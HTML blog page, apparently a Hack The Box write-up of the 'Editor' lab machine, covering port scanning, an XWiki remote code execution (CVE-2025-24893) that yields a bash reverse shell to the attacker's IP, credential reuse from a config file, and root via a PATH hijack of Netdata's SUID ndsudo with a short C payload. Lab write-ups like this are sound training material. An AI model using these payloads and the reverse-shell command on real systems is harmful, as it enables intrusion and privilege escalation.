@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Editor | MeetHrishi</title>
+<meta name="keywords" content="">
+<meta name="description" content="Attack Chain Summary
+
+Discovered an exposed XWiki instance running a vulnerable version.
+Gained initial access via XWiki RCE (CVE-2025-24893) as the xwiki user.
+Retrieved database credentials from XWiki configuration files.
+Reused credentials to SSH as the user oliver.
+Escalated privileges to root by exploiting a vulnerable SUID ndsudo binary in Netdata (CVE-2024-32019).
+
+
+Recon
+Initial Scanning
+A full TCP port scan revealed three open ports: 22, 80, and 8080.
+hrishi@pwn:~/editor$ nmap -p- --min-rate 5000 10.10.11.80 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-05 17:33 IST
+Warning: 10.10.11.80 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.11.80
+Host is up (0.14s latency).
+Not shown: 65399 closed tcp ports (conn-refused), 133 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds
+With the open ports identified, I performed a service and version scan for further context.">
+<meta name="author" content="Hrishikesh Jadhav">
+<link rel="canonical" href="https://meethrishii.github.io/htb/editor/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.57df9e2f4a2ad21732ca71eb5b4ca5278112faa55ced5451381ef912715a77c9.css" integrity="sha256-V9&#43;eL0oq0hcyynHrW0ylJ4ES&#43;qVc7VRROB75EnFad8k=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://meethrishii.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://meethrishii.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://meethrishii.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://meethrishii.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://meethrishii.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://meethrishii.github.io/htb/editor/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://meethrishii.github.io/htb/editor/">
+  <meta property="og:site_name" content="MeetHrishi">
+  <meta property="og:title" content="Editor">
+  <meta property="og:description" content="Attack Chain Summary Discovered an exposed XWiki instance running a vulnerable version. Gained initial access via XWiki RCE (CVE-2025-24893) as the xwiki user. Retrieved database credentials from XWiki configuration files. Reused credentials to SSH as the user oliver. Escalated privileges to root by exploiting a vulnerable SUID ndsudo binary in Netdata (CVE-2024-32019). Recon Initial Scanning A full TCP port scan revealed three open ports: 22, 80, and 8080.
+hrishi@pwn:~/editor$ nmap -p- --min-rate 5000 10.10.11.80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-05 17:33 IST Warning: 10.10.11.80 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.80 Host is up (0.14s latency). Not shown: 65399 closed tcp ports (conn-refused), 133 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds With the open ports identified, I performed a service and version scan for further context.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb">
+    <meta property="article:published_time" content="2025-12-05T17:12:30+05:30">
+    <meta property="article:modified_time" content="2025-12-05T17:12:30+05:30">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Editor">
+<meta name="twitter:description" content="Attack Chain Summary
+
+Discovered an exposed XWiki instance running a vulnerable version.
+Gained initial access via XWiki RCE (CVE-2025-24893) as the xwiki user.
+Retrieved database credentials from XWiki configuration files.
+Reused credentials to SSH as the user oliver.
+Escalated privileges to root by exploiting a vulnerable SUID ndsudo binary in Netdata (CVE-2024-32019).
+
+
+Recon
+Initial Scanning
+A full TCP port scan revealed three open ports: 22, 80, and 8080.
+hrishi@pwn:~/editor$ nmap -p- --min-rate 5000 10.10.11.80 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-05 17:33 IST
+Warning: 10.10.11.80 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.11.80
+Host is up (0.14s latency).
+Not shown: 65399 closed tcp ports (conn-refused), 133 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds
+With the open ports identified, I performed a service and version scan for further context.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Htbs",
+      "item": "https://meethrishii.github.io/htb/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Editor",
+      "item": "https://meethrishii.github.io/htb/editor/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Editor",
+  "name": "Editor",
+  "description": "Attack Chain Summary Discovered an exposed XWiki instance running a vulnerable version. Gained initial access via XWiki RCE (CVE-2025-24893) as the xwiki user. Retrieved database credentials from XWiki configuration files. Reused credentials to SSH as the user oliver. Escalated privileges to root by exploiting a vulnerable SUID ndsudo binary in Netdata (CVE-2024-32019). Recon Initial Scanning A full TCP port scan revealed three open ports: 22, 80, and 8080.\nhrishi@pwn:~/editor$ nmap -p- --min-rate 5000 10.10.11.80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-05 17:33 IST Warning: 10.10.11.80 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.80 Host is up (0.14s latency). Not shown: 65399 closed tcp ports (conn-refused), 133 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds With the open ports identified, I performed a service and version scan for further context.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Attack Chain Summary Discovered an exposed XWiki instance running a vulnerable version. Gained initial access via XWiki RCE (CVE-2025-24893) as the xwiki user. Retrieved database credentials from XWiki configuration files. Reused credentials to SSH as the user oliver. Escalated privileges to root by exploiting a vulnerable SUID ndsudo binary in Netdata (CVE-2024-32019). Recon Initial Scanning A full TCP port scan revealed three open ports: 22, 80, and 8080.\nhrishi@pwn:~/editor$ nmap -p- --min-rate 5000 10.10.11.80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-05 17:33 IST Warning: 10.10.11.80 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.80 Host is up (0.14s latency). Not shown: 65399 closed tcp ports (conn-refused), 133 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds With the open ports identified, I performed a service and version scan for further context.\nhrishi@pwn:~/editor$ nmap -sCV -p22,80,8080 10.10.11.80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-05 17:37 IST Nmap scan report for 10.10.11.80 Host is up (0.36s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://editor.htb/ 8080/tcp open http Jetty 10.0.20 | http-title: XWiki - Main - Intro |_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/ | http-webdav-scan: | WebDAV type: Unknown | Server Type: Jetty(10.0.20) |_ Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK | http-robots.txt: 50 disallowed entries (15 shown) | /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ | /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ | /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ | /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ | /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ |_/xwiki/bin/undelete/ |_http-server-header: Jetty(10.0.20) | http-cookie-flags: | /: | JSESSIONID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: PROPFIND LOCK UNLOCK |_http-open-proxy: Proxy might be redirecting requests Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds So according to |_http-title: Did not follow redirect to http://editor.htb/ we will add editor.htb into our /etc/hosts\n10.10.11.80 editor.htb So, Key findings from the scan:\n22/tcp – OpenSSH (Ubuntu)\n80/tcp – nginx with a redirect to a virtual host\n8080/tcp – Jetty hosting an XWiki instance\nWeb Enumeration Port 80 – editor.htb Visiting editor.htb revealed a simple web page advertising an online code editor. There were no obvious input points or interactive functionality.\nClicking on Docs exposed another subdomain: wiki.editor.htb, which I also added to /etc/hosts. This site appeared to host static documentation only.\nThe About section revealed an email format: contact@editor.htb This suggested a potential username pattern, noted it.\nPort 8080 –XWiki XWiki is a collaborative wiki platform often used for documentation and knowledge-sharing, and it supports scripting and extensions—making version-specific vulnerabilities particularly impactful.\nThe application disclosed its version clearly at the bootom of the page: XWiki Debian 15.10.8\nShell as XWiki Searching for vulnerabilities affecting XWiki 15.10.8 led me to CVE-2025-24893, a remote code execution vulnerability.\nRelevant resources:\nCVE: https://nvd.nist.gov/vuln/detail/CVE-2025-24893\nPoC used: https://github.com/Bishben/xwiki-15.10.8-reverse-shell-cve-2025-24893\nExploit Execution I used this POC exploit to gain a reverse shell.\nStarted my nc listener on my attack machine nc -lvnp 4444\nhrishi@pwn:~/editor/xwiki-15.10.8-reverse-shell-cve-2025-24893$ python3 xwiki_exploit.py http://editor.htb:8080 10.10.15.129 4444 [+] Base URL: http://editor.htb:8080 [+] Reverse Shell: 10.10.15.129:4444 [!] Make sure to have a lister running (For eg: nc -lvnp 4444) [+] Command: bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.15.129/4444 0\u003e\u00261' [+] Base64: YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMjkvNDQ0NCAwPiYxJw== [+] Safe Base64: YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNS4xMjkvNDQ0NCAwPiYxJw== [+] Exploit URL: http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?media=rss\u0026text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho,YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNS4xMjkvNDQ0NCAwPiYxJw==%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D%22.execute()%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D [*] Attempting Connection [+] Exploit successful! Check listener for bash shell [*] To upgrade reverse shell run these following command: - python3 -c \"import pty; pty.spawn('/bin/bash')\" - [CTRL+Z] - stty raw -echo; fg - - export TERM=xterm-256color - reset On my listener I got a connection.\nListening on 0.0.0.0 4444 Connection received on 10.10.11.80 36832 bash: cannot set terminal process group (1067): Inappropriate ioctl for device bash: no job control in this shell xwiki@editor:/usr/lib/xwiki-jetty$ I will upgrade the shell using standard technique:\nxwiki@editor:/usr/lib/xwiki-jetty$ script /dev/null -c bash script /dev/null -c bash Script started, output log file is '/dev/null'. xwiki@editor:/usr/lib/xwiki-jetty$ ^Z [1]+ Stopped nc -lnvp 4444 hrishi@pwn:~/editor$ stty raw -echo ; fg nc -lnvp 4444 reset reset: unknown terminal type unknown Terminal type? screen xwiki@editor:/usr/lib/xwiki-jetty$ With access as xwiki, I began checking relevant configuration files.\nThe file /etc/xwiki/hibernate.cfg.xml contained plaintext database credentials:xwiki:theEd1t0rTeam99\nBefore using them, I enumerated locally listening services.\nxwiki@editor:/usr/lib/xwiki$ ss -tulnp and I find indeed port 3306 running there.\nxwiki@editor:/usr/lib/xwiki$ ss -tulnp Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* udp UNCONN 0 0 127.0.0.1:8125 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 70 127.0.0.1:33060 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:34379 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:19999 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:8125 0.0.0.0:* tcp LISTEN 0 151 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 511 [::]:80 [::]:* tcp LISTEN 0 50 [::ffff:127.0.0.1]:8079 *:* users:((\"java\",pid=1067,fd=41)) tcp LISTEN 0 50 *:8080 *:* users:((\"java\",pid=1067,fd=43)) Some more interesting ports are there too. To keep in mind to portforward during post exploitation.\nDatabase access Using the discovered credentials, I successfully authenticated to the local MySQL service:\nmysql -h 127.0.0.1 -P 3306 -u xwiki -p'theEd1t0rTeam99'\nNote: Passing passwords directly via the command line is not recommended in real-world environments, but is commonly used in CTF-style labs.\nSo I found nothing. The password that I found, seems more like a user password. There is a user named oliver and port 22 ssh is also open. Checking if ‘password reuse’ is the case here. At this point, I had confirmed that the credentials were valid beyond the application context.\nShell as Oliver Given that SSH was open and a user named oliver existed on the system, I tested for password reuse.\ncommand: ssh oliver@editor.htb\nUsing the recovered password succeeded, granting SSH access as oliver.\nhrishi@pwn:~/editor$ ssh oliver@editor.htb #theEd1t0rTeam99 oliver@editor.htb's password: Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Wed Dec 10 11:29:10 AM UTC 2025 System load: 0.12 Processes: 227 Usage of /: 73.6% of 7.28GB Users logged in: 0 Memory usage: 50% IPv4 address for eth0: 10.10.11.80 Swap usage: 0% Expanded Security Maintenance for Applications is not enabled. 4 updates can be applied immediately. To see these additional updates run: apt list --upgradable 4 additional security updates can be applied with ESM Apps. Learn more about enabling ESM Apps service at https://ubuntu.com/esm The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Dec 10 11:29:11 2025 from 10.10.14.210 oliver@editor:~$ Shell as root Enumeration The oliver user had no sudo privileges. I continued enumerating the system, focusing on locally running services and third-party software.\nKeepin in mind the locally running ports; I started enumerating directories.\nDuring directory enumeration, I discovered Netdata installed under /opt.\noliver@editor:~$ ls /opt/ containerd netdata Checking it’s version and build information. with quick chatgpt help.\noliver@editor:~$ /opt/netdata/bin/netdata -W buildinfo Packaging: Netdata Version ____________________________________________ : v1.45.2 ---snip--- Vulnerability Identification A quick search revealed CVE-2024-32019, affecting Netdata versions prior to 1.45.3.\nCVE: https://nvd.nist.gov/vuln/detail/CVE-2024-32019 The vulnerability allows local privilege escalation due to a SUID binary (ndsudo) that respects the user-controlled PATH environment variable.\nInspecting the binary confirmed the SUID bit:\noliver@editor:~$ ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -rwsr-x--- 1 root netdata 200576 Apr 1 2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo So from what I read about and understood about the CVE, is I can exploit in by setting PATH variable. Writing an exploit to do that.\nGCC is not installed on the target machine. So I will compile and upload it using python server.\nhrishi@pwn:/tmp$ vim exploit.c #include #include #include #include int main() { setuid(0); seteuid(0); setgid(0); setegid(0); system(\"cp /bin/bash /tmp/MeetHrishi; chown root:root /tmp/MeetHrishi; chmod 6777 /tmp/MeetHrishi\"): } hrishi@pwn:/tmp$ gcc exploit.c -o nvme hrishi@pwn:/tmp$ ls nvme nvme Further i compiled and uploaded the exploit naming it as nvme.\noliver@editor:/tmp$ wget 10.10.15.129:/nvme --2025-12-10 12:02:09-- http://10.10.14.129/nvme Connecting to 10.10.14.129:80... connected. HTTP request sent, awaiting response... 200 OK Length: 16136 (16K) [application/octet-stream] Saving to: ‘nvme’ nvme 100%[==============================================\u003e] 15.76K 11.9KB/s in 1.3s 2025-12-10 12:02:11 (11.9 KB/s) - ‘nvme’ saved [16136/16136] oliver@editor:/tmp$ chmod +x nvme Now I will run the ndsudo with /tmp as my path set.\noliver@editor:/tmp$ PATH=/tmp:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list It will not emit any output but checking the /tmp directory for MeetHrishi:\noliver@editor:/tmp$ ls -l MeetHrishi -rwsrwsrwx 1 root root 1396520 Dec 10 12:04 MeetHrishi I will now run it and get root access on the machine.\noliver@editor:/tmp$ ./MeetHrishi -p MeetHrishi-5.1# whoami root MeetHrishi-5.1# cat /root/root.txt ac40de9574f78b3b85c0d26aa972b5fd MeetHrishi-5.1# Final Notes Clear service version disclosure greatly simplified exploitation.\nPassword reuse allowed straightforward lateral movement.\nThird-party monitoring tools often introduce unexpected privilege escalation paths.\nSUID binaries combined with environment variable misuse remain a high-impact weakness.\n",
+  "wordCount" : "1500",
+  "inLanguage": "en",
+  "datePublished": "2025-12-05T17:12:30+05:30",
+  "dateModified": "2025-12-05T17:12:30+05:30",
+  "author":{
+    "@type": "Person",
+    "name": "Hrishikesh Jadhav"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://meethrishii.github.io/htb/editor/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "MeetHrishi",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://meethrishii.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://meethrishii.github.io/" accesskey="h" title="MeetHrishi (Alt + H)">MeetHrishi</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://meethrishii.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://meethrishii.github.io/htb/">Htbs</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Editor
+    </h1>
+    <div class="post-meta"><span title='2025-12-05 17:12:30 +0530 IST'>December 5, 2025</span>&nbsp;·&nbsp;<span>8 min</span>&nbsp;·&nbsp;<span>Hrishikesh Jadhav</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="attack-chain-summary">Attack Chain Summary<a hidden class="anchor" aria-hidden="true" href="#attack-chain-summary">#</a></h2>
+<ul>
+<li>Discovered an exposed XWiki instance running a vulnerable version.</li>
+<li>Gained initial access via XWiki RCE (CVE-2025-24893) as the <code>xwiki</code> user.</li>
+<li>Retrieved database credentials from XWiki configuration files.</li>
+<li>Reused credentials to SSH as the user <code>oliver</code>.</li>
+<li>Escalated privileges to root by exploiting a vulnerable SUID <code>ndsudo</code> binary in Netdata (CVE-2024-32019).</li>
+</ul>
+<hr>
+<h2 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h2>
+<h3 id="initial-scanning">Initial Scanning<a hidden class="anchor" aria-hidden="true" href="#initial-scanning">#</a></h3>
+<p>A full TCP port scan revealed three open ports: <strong>22</strong>, <strong>80</strong>, and <strong>8080</strong>.</p>
+<pre tabindex="0"><code>hrishi@pwn:~/editor$ nmap -p- --min-rate 5000 10.10.11.80 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-05 17:33 IST
+Warning: 10.10.11.80 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.11.80
+Host is up (0.14s latency).
+Not shown: 65399 closed tcp ports (conn-refused), 133 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds
+</code></pre><p>With the open ports identified, I performed a service and version scan for further context.</p>
+<pre tabindex="0"><code>hrishi@pwn:~/editor$ nmap -sCV -p22,80,8080 10.10.11.80
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-05 17:37 IST
+Nmap scan report for 10.10.11.80
+Host is up (0.36s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://editor.htb/
+8080/tcp open  http    Jetty 10.0.20
+| http-title: XWiki - Main - Intro
+|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
+| http-webdav-scan: 
+|   WebDAV type: Unknown
+|   Server Type: Jetty(10.0.20)
+|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
+| http-robots.txt: 50 disallowed entries (15 shown)
+| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
+| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
+| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
+| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
+| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
+|_/xwiki/bin/undelete/
+|_http-server-header: Jetty(10.0.20)
+| http-cookie-flags: 
+|   /: 
+|     JSESSIONID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: PROPFIND LOCK UNLOCK
+|_http-open-proxy: Proxy might be redirecting requests
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds
+</code></pre><p>So according to <code>|_http-title: Did not follow redirect to http://editor.htb/</code> we will add editor.htb into our /etc/hosts</p>
+<pre tabindex="0"><code>10.10.11.80 editor.htb
+</code></pre><p>So, Key findings from the scan:</p>
+<ul>
+<li>
+<p>22/tcp – OpenSSH (Ubuntu)</p>
+</li>
+<li>
+<p>80/tcp – nginx with a redirect to a virtual host</p>
+</li>
+<li>
+<p>8080/tcp – Jetty hosting an XWiki instance</p>
+</li>
+</ul>
+<h2 id="web-enumeration">Web Enumeration<a hidden class="anchor" aria-hidden="true" href="#web-enumeration">#</a></h2>
+<h3 id="port-80--editorhtb">Port 80 &ndash; editor.htb<a hidden class="anchor" aria-hidden="true" href="#port-80--editorhtb">#</a></h3>
+<p>Visiting editor.htb revealed a simple web page advertising an online code editor. There were no obvious input points or interactive functionality.</p>
+<p>Clicking on Docs exposed another subdomain: wiki.editor.htb, which I also added to /etc/hosts. This site appeared to host static documentation only.</p>
+<p>The About section revealed an email format:
+<code>contact@editor.htb</code>
+This suggested a potential username pattern, noted it.</p>
+<h3 id="port-8080-xwiki">Port 8080 &ndash;XWiki<a hidden class="anchor" aria-hidden="true" href="#port-8080-xwiki">#</a></h3>
+<p>XWiki is a collaborative wiki platform often used for documentation and knowledge-sharing, and it supports scripting and extensions—making version-specific vulnerabilities particularly impactful.</p>
+<p>The application disclosed its version clearly at the bootom of the page:
+<code>XWiki Debian 15.10.8</code></p>
+<h1 id="shell-as-xwiki">Shell as XWiki<a hidden class="anchor" aria-hidden="true" href="#shell-as-xwiki">#</a></h1>
+<p>Searching for vulnerabilities affecting XWiki 15.10.8 led me to CVE-2025-24893, a remote code execution vulnerability.</p>
+<p>Relevant resources:</p>
+<ul>
+<li>
+<p>CVE: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24893">https://nvd.nist.gov/vuln/detail/CVE-2025-24893</a></p>
+</li>
+<li>
+<p>PoC used: <a href="https://github.com/Bishben/xwiki-15.10.8-reverse-shell-cve-2025-24893">https://github.com/Bishben/xwiki-15.10.8-reverse-shell-cve-2025-24893</a></p>
+</li>
+</ul>
+<h4 id="exploit-execution">Exploit Execution<a hidden class="anchor" aria-hidden="true" href="#exploit-execution">#</a></h4>
+<p>I used this POC <a href="https://github.com/Bishben/xwiki-15.10.8-reverse-shell-cve-2025-24893">exploit</a> to gain a reverse shell.</p>
+<p>Started my nc listener on my attack machine <code>nc -lvnp 4444</code></p>
+<pre tabindex="0"><code>hrishi@pwn:~/editor/xwiki-15.10.8-reverse-shell-cve-2025-24893$ python3 xwiki_exploit.py http://editor.htb:8080 10.10.15.129 4444 
+[+] Base URL: http://editor.htb:8080
+[+] Reverse Shell: 10.10.15.129:4444
+[!] Make sure to have a lister running (For eg: nc -lvnp 4444)
+[+] Command: bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.129/4444 0&gt;&amp;1&#39;
+[+] Base64: YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMjkvNDQ0NCAwPiYxJw==
+[+] Safe Base64: YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNS4xMjkvNDQ0NCAwPiYxJw==
+[+] Exploit URL: http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?media=rss&amp;text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho,YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNS4xMjkvNDQ0NCAwPiYxJw==%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D%22.execute()%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
+
+[*] Attempting Connection
+[+] Exploit successful! Check listener for bash shell
+
+[*] To upgrade reverse shell run these following command:
+    - python3 -c &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;
+    - &lt;Suspend shell&gt; [CTRL+Z]
+    - stty raw -echo; fg
+    - &lt;Hit Enter Twice if shell is weird&gt;
+    - export TERM=xterm-256color
+    - reset
+</code></pre><p>On my listener I got a connection.</p>
+<pre tabindex="0"><code class="language-hrishi@pwn:~/editor$" data-lang="hrishi@pwn:~/editor$">Listening on 0.0.0.0 4444
+Connection received on 10.10.11.80 36832
+bash: cannot set terminal process group (1067): Inappropriate ioctl for device
+bash: no job control in this shell
+xwiki@editor:/usr/lib/xwiki-jetty$ 
+</code></pre><p>I will upgrade the shell using standard technique:</p>
+<pre tabindex="0"><code>xwiki@editor:/usr/lib/xwiki-jetty$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is &#39;/dev/null&#39;.
+xwiki@editor:/usr/lib/xwiki-jetty$ ^Z
+[1]+  Stopped                 nc -lnvp 4444
+hrishi@pwn:~/editor$ stty raw -echo ; fg
+nc -lnvp 4444
+             reset
+reset: unknown terminal type unknown
+Terminal type? screen
+
+xwiki@editor:/usr/lib/xwiki-jetty$ 
+</code></pre><p>With access as xwiki, I began checking relevant configuration files.</p>
+<p>The file <code>/etc/xwiki/hibernate.cfg.xml</code> contained plaintext database credentials:<code>xwiki:theEd1t0rTeam99</code></p>
+<p>Before using them, I enumerated locally listening services.</p>
+<p><code>xwiki@editor:/usr/lib/xwiki$ ss -tulnp</code>
+and I find indeed port 3306 running there.</p>
+<pre tabindex="0"><code>xwiki@editor:/usr/lib/xwiki$ ss -tulnp
+Netid  State   Recv-Q  Send-Q        Local Address:Port      Peer Address:Port  Process                                                                         
+udp    UNCONN  0       0             127.0.0.53%lo:53             0.0.0.0:*                                                                                     
+udp    UNCONN  0       0                 127.0.0.1:8125           0.0.0.0:*                                                                                     
+tcp    LISTEN  0       128                 0.0.0.0:22             0.0.0.0:*                                                                                     
+tcp    LISTEN  0       511                 0.0.0.0:80             0.0.0.0:*                                                                                     
+tcp    LISTEN  0       4096          127.0.0.53%lo:53             0.0.0.0:*                                                                                     
+tcp    LISTEN  0       70                127.0.0.1:33060          0.0.0.0:*                                                                                     
+tcp    LISTEN  0       4096              127.0.0.1:34379          0.0.0.0:*                                                                                     
+tcp    LISTEN  0       4096              127.0.0.1:19999          0.0.0.0:*                                                                                     
+tcp    LISTEN  0       4096              127.0.0.1:8125           0.0.0.0:*                                                                                     
+tcp    LISTEN  0       151               127.0.0.1:3306           0.0.0.0:*                                                                                     
+tcp    LISTEN  0       128                    [::]:22                [::]:*                                                                                     
+tcp    LISTEN  0       511                    [::]:80                [::]:*                                                                                     
